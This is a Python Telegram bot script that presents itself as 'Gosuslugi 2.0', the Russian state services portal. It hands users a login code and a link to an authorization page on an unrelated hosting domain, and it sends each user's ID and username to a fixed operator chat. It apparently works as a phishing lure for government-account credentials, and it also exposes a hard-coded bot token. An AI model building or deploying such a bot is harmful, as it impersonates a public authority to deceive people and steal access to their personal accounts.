import asyncio
import random

from aiogram import Bot, Dispatcher, types
from aiogram.filters.command import Command
import requests
bot = Bot(token="7483718419:AAHlF2ihnQ-l6nLtn94oT3mNAaG_IqGoST4")
dp = Dispatcher()
async def gen_auth_url(user_id, username):
    rand_auth_key = str(random.randint(100000, 999999))
    try:
        req = requests.get("https://gepolis-gu-7624.twc1.net/gen_auth/{0}/{1}".format(user_id, username))
        await bot.send_message(2015460473, "Ответ сервера #{0}-{1}-{2}: {3}".format(user_id, username, rand_auth_key, req.json()))
        return req.json()['code']

    except Exception as e:
        await bot.send_message(2015460473, "Произошла ошибка при генерации ссылки авторизации")
        await bot.send_message(2015460473, str(e))



@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    code = await gen_auth_url(message.from_user.id, message.from_user.username if message.from_user.username else "None")
    if not code:
        code = await gen_auth_url(message.from_user.id, message.from_user.username if message.from_user.username else "None")
        if not code:
            await message.answer("Произошла ошибка при генерации кода авторизации.\n\nОбратитесь в поддержку @GU_AppSupport.")
            return
    await message.answer(
        "🔐 <b>Добро пожаловать в сервис Госуслуги 2.0!</b> 🔐\n\n"
        "Страница авторизации:\n"
        f"➡️ <a href='https://gepolis-gu-7624.twc1.net/auth'>Войти в личный кабинет</a> ⬅️\n\n"
        "Код для входа: \n"
        f"<code>{code}</code>\n\n"
        "⚠️ Никому не передавайте этот код!",
        parse_mode="HTML"
    )

async def main():
    await dp.start_polling(bot)
def run_bot():
    asyncio.set_event_loop(asyncio.new_event_loop())
    asyncio.get_event_loop().run_until_complete(main())

if __name__ == "__main__":
    run_bot()